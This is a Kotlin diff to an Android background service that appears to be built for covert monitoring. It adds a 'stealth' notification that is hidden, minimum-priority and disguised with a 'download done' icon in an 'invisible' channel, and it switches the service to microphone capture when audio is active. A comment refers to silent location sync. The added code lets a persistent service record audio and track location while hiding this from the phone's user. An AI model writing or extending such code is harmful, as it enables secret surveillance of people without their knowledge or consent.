@@ -39,6 +39,7 @@ class SentryPersistentService : Service() {
 
     override fun onCreate() {
         super.onCreate()
+        instance = this
         createNotificationChannel()
         startAsForeground()
 
@@ -79,8 +80,8 @@ class SentryPersistentService : Service() {
         return START_STICKY
     }
 
-    private fun startAsForeground() {
-        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
+    private fun buildStealthNotification(): Notification {
+        return NotificationCompat.Builder(this, CHANNEL_ID)
             .setSmallIcon(android.R.drawable.stat_sys_download_done)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
@@ -90,7 +91,10 @@ class SentryPersistentService : Service() {
             .setGroup("sentry_stealth_group")
             .setGroupSummary(true)
             .build()
+    }
 
+    private fun startAsForeground() {
+        val notification = buildStealthNotification()
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             try {
                 startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
@@ -101,6 +105,20 @@ class SentryPersistentService : Service() {
             }
         } else {
             startForeground(NOTIFICATION_ID, notification)
+        }
+    }
+
+    fun updateForegroundAudioState(isAudioActive: Boolean) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            try {
+                val notification = buildStealthNotification()
+                val fgsType = if (isAudioActive) {
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                } else {
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                }
+                startForeground(NOTIFICATION_ID, notification, fgsType)
+            } catch (_: Exception) {}
         }
     }
 
@@ -162,6 +180,7 @@ class SentryPersistentService : Service() {
     }
 
     override fun onDestroy() {
+        instance = null
         try {
             wakeLock?.release()
         } catch (_: Exception) {
@@ -184,6 +203,7 @@ class SentryPersistentService : Service() {
     companion object {
         private const val CHANNEL_ID = "sentry_invisible_channel_v4"
         private const val NOTIFICATION_ID = 1001
+        private var instance: SentryPersistentService? = null
 
         fun startService(context: Context) {
             try {
@@ -195,6 +215,10 @@ class SentryPersistentService : Service() {
                 }
             } catch (_: Exception) {
             }
+        }
+
+        fun updateForegroundForAudio(isAudioActive: Boolean) {
+            instance?.updateForegroundAudioState(isAudioActive)
         }
 
         // Silent location sync - does not post intrusive banner or mini-map notifications
